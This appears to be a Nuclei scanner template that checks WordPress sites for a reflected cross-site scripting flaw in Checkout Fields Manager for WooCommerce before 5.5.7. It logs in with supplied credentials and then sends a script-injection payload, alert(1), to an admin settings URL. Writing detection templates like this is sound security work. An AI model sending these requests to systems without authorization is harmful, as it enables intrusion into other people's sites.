id: checkout-fields-manager-xss
info:
  author: Akincibor
  description: The plugin does not escape some URLs before outputting them back in
    attributes, leading to Reflected Cross-Site Scripting.
  metadata:
    verified: true
  name: Checkout Fields Manager for WooCommerce < 5.5.7 - Reflected Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/ea617acd-348a-4060-a8bf-08ab3b569577
  - https://wordpress.org/plugins/woocommerce-checkout-manager
  severity: medium
  tags: wp-plugin,xss,wp,wordpress,authenticated,woocommerce
requests:
- cookie-reuse: true
  matchers:
  - part: body
    type: word
    words:
    - '>--><script>alert(1)</script>&action=wooccm_nuke_options&'
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Origin: {{RootURL}}

    Content-Type: application/x-www-form-urlencoded

    Cookie: wordpress_test_cookie=WP%20Cookie%20check


    log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

    '
  - 'GET /wp-admin/admin.php?page=wc-settings&tab=wooccm&section=advanced&">--><script>alert(1)</script>
    HTTP/1.1

    Host: {{Hostname}}

    '
